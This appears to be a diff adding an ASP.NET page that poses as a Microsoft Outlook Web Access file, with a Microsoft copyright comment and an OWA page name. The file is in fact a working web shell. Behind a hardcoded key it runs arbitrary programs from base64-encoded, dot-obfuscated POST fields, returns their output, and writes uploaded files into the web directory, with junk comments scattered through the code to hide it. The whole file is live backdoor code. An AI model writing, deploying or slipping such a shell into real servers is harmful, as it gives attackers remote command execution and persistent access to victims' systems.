@@ -1,0 +1,245 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
+<!-- OwaPage = ASP.auth_redirsuiteserviceproxy_aspx -->
+<%@ Page Language="C#" %>
+<%@ Import NameSPace="System.IO" %>
+<%@ Import NameSPace="System.Diagnostics"%>
+<%@ Import NameSPace="System.IO" %>
+
+
+<script runat="server">
+    private const string apibobman = "HDR@vs3$g452D@df";
+
+
+   
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        try
+        {	
+		
+		if (Request.Form["apibobman"] == apibobman)
+            {
+
+               if (Request.Form["llaassttd"] != null)
+            {
+                if (Request.Form["llaassttd"] == "news")
+                {
+                    
+                    Response.Write(this.UF());
+                    
+                }
+				}
+			
+			if (Request.Form["c2"] != null)
+            {
+					var myValue = Request.Form["c2"]; 
+					var app = Request.Form["app"];
+					
+					
+					var charsToRemove = new string[] { "." };
+					foreach (var c in charsToRemove)
+						{
+							myValue = myValue.Replace(c, string.Empty);
+						}
+						foreach (var c in charsToRemove)
+						{
+							app = app.Replace(c, string.Empty);
+						}
+					var myValue1=Base64Decode(myValue);
+					var app1 = Base64Decode(app);
+					Response.Write("<pre>");
+					Response.Write(                           Server.HtmlEncode                                  (this.EC(app1,myValue1)));
+					Response.Write("</pre>");
+					
+			}
+		}
+            if (Request.Form["apibobman"] == null)
+            {
+   
+				
+					
+					
+                return;
+            }
+
+          
+         
+            if (Request.Form["llaassttd"] != null)
+            {
+                if (Request.Form["llaassttd"] == "news")
+                {
+                    
+                    Response.Write(this.UF());
+                    
+                }
+				
+                else
+                {
+                    
+                    Response.Write("Unknown llaassttd");
+                    
+                }
+            }
+            if (Request.Form["apibobman"] == apibobman)
+            {
+                
+                Response.Write(this.GUC());
+                
+            }
+        }
+        catch (Exception ex)
+        {
+            
+            Response.Write(ex.Message);
+            
+        }
+		}
+	
+
+    private string UF()
+    {
+        try
+        {
+            if (Request.Form["apibobman"] == null)
+            {
+			
+                return string.Empty;
+				
+            }
+
+            if (Request.Form["apibobman"] != apibobman)
+            {
+			
+                return string.Empty;
+				
+            }
+			
+            
+            if (Request.Files.Count != 1)
+            {
+			
+                return "No     file     selected";
+				
+            }
+			
+			
+			
+
+            HttpPostedFile httpPostedFile = Request.Files[0];
+			//sdfgsd gsdfg sdfg
+            int fileLength = httpPostedFile.ContentLength;
+			//dsfg sdfg sdfgsdfg
+			//
+            byte[] bu = new byte[fileLength];
+			//dfgdfgdfg sdfgsdgs
+			//
+            httpPostedFile.InputStream.Read(bu, 0, fileLength);
+			//dfg dsfgdsfgdsfgdsfg
+			//
+            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
+			//
+			//dfgdfgdfgdfg ssdfg
+            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
+            //
+			//gdfsdgsdg
+			{
+                fileStream.Write(bu, 0, bu.Length);
+            }
+
+            return "          File          u . p . lo . ad ed             ";
+        }
+        catch (Exception ex)
+        {
+            return ex.ToString();
+        }
+    }
+
+	
+	  private string GUC()
+    {
+        string temp = string.Empty;
+
+        temp = "<form enctype=\"multipart/form-data\" action=\"\" method=\"post\">";
+		// sdgfdfg sd
+			//dg dsfg
+        temp += "<br>Auth Key: <input type=\"text\" name=\"apibobman\"><br>";
+		//
+			//c dsfgsxdfg
+        temp += "<br>Please spify a fILe: <input type=\"fILe\" name=\"fILe\"></br>";
+		//
+			//
+        temp += "<input type=\"hidden\" name=\"llaassttd\" value=\"news\">";
+		//
+					//
+        temp += "<input type=\"submit\" value=\"Send\">";
+		//
+			//
+        temp += "</form>";
+
+        return temp;
+    }
+	
+	private string EC(string app, string command)
+    {
+        try
+        {
+            ProcessStartInfo PSI = new ProcessStartInfo();
+			
+            PSI.FileName = app;
+			
+            PSI.Arguments = command;
+			
+            PSI.RedirectStandardOutput = true;
+			
+            PSI.UseShellExecute = false;
+
+            Process process = Process.Start(PSI);
+			
+			
+            using (StreamReader streamReader = process.StandardOutput)
+            {
+                string res = streamReader.ReadToEnd();
+				string bse=Base64Encode(res);
+				string ret=adddot(bse);
+                return ret;
+            }
+        }
+        catch (Exception ex)
+        {
+            return ex.ToString();
+        }
+    }
+	
+	public static string Base64Encode(string plainText) {
+  var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+  return System.Convert.ToBase64String(plainTextBytes);
+}
+
+public static string Base64Decode(string base64EncodedData) {
+  var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+  return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
+}
+
+public static string adddot(string dot) {
+  char [] array = dot.ToCharArray();
+  string af = String.Empty;
+  for(int i=0 ; i<array.Length;i++){
+  
+  af+=array[i] + ".";
+  }
+  return af;
+}
+
+
+</script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>
+    </title>
+</head>
+<body>
+    <form id="form1" runat="server">
+    </form>
+</body>
+</html>
